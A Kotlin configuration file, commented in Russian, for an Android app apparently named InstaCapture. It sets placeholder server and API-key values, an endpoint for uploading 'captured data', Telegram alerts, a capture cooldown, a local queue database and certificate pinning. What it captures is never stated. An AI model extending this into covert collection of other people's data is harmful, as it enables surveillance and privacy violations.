package com.instacapture

/**
 * Конфигурация приложения — центральное хранилище констант.
 * ВНИМАНИЕ: перед деплоем обязательно замените SERVER_URL и API_KEY
 * на реальные значения вашего VPS.
 */
object Config {
    // ================== СЕРВЕР ==================
    // TODO: Заменить на реальный домен или IP вашего VPS
    const val SERVER_URL = "https://your-vps.com"
    
    // TODO: Заменить на API-ключ, указанный в .env сервера (API_KEY)
    const val API_KEY = "YOUR_API_KEY_HERE"
    
    // Полный URL для отправки захваченных данных
    const val CAPTURE_ENDPOINT = "$SERVER_URL/api/capture"
    
    // ================== TELEGRAM ==================
    const val TELEGRAM_NOTIFICATIONS = true
    
    // ================== ЗАЩИТА ==================
    // Таймаут между захватами — защита от дублирования (5 секунд)
    const val CAPTURE_COOLDOWN_MS = 5000L
    
    // ================== ОТЛАДКА ==================
    // Включает подробное логирование в Logcat (тег: InstaCapture)
    const val DEBUG_MODE = false
    
    // ================== БАЗА ДАННЫХ ==================
    const val DB_NAME = "instacapture_queue.db"
    const val DB_VERSION = 1
    
    // ================== СЕТЬ ==================
    // Таймаут соединения с сервером (30 секунд)
    const val CONNECT_TIMEOUT_MS = 30000L
    const val READ_TIMEOUT_MS = 30000L
    
    // ================== PINNING ==================
    // TODO: Заменить на SHA-256 публичного ключа вашего SSL-сертификата
    // Получить можно командой: openssl s_client -connect your-vps.com:443 | openssl x509 -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64
    const val PINNED_CERTIFICATE_HASH = "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
}